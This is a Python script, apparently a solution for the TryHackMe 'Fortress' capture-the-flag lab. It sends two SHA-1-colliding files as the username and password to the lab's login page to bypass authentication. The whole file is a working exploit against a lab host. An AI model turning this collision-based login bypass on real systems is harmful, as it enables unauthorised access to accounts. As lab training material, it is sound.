# This code is meant to be executed only while solving THM Challenge "Fortress"!
# Written by: Yuval Quina
from urllib.parse import quote_from_bytes
import requests

def get_file_binary_content_as_str(file_path:str):
    # A function which returns the file's binary content.
    with open(file_path, "rb") as file:
    	return quote_from_bytes(file.read())
    	
def is_file_name_valid(file_name:str):
    # A function which returns True if the file name is valid, otherwise False.
    return ("/" not in file_name) and ("\0" not in file_name)
    
    
if __name__ == "__main__":
    # Getting the files that their content colliding after encoding it using SHA-1.
    first_file = input("Enter the file path of the first file: ")
    while not is_file_name_valid(first_file):
    	print("The file name isn't valid")
    	first_file = input("Enter the file path of the first file: ")
    	
    second_file = input("Enter the file path of the second file: ")
    while not is_file_name_valid(second_file):
    	print("The file name isn't valid or txt")
    	second_file = input("Enter the file path of the second file: ")
    
    # Saving the files' binary content to the right credentails
    username = get_file_binary_content_as_str(first_file)
    password = get_file_binary_content_as_str(second_file)

    # Send the login request
    respond = requests.get(f"http://fortress:7331/t3mple_0f_y0ur_51n5.php?user={username}&pass={password}")

    # Checking the login attempts
    fail_messages = ["You can't cross the gates of the temple, GO AWAY!!.", "Nah, babe that ain't gonna work", "I feel pitty for you", "Invalid password."]
    if any(fail_msg in respond.text for fail_msg in fail_messages):
        print("Something went wrong while login.")
    else:
        print("You successfully logged in the fortress!!!")
    	
    print("The respond content:")
    print(respond.content)
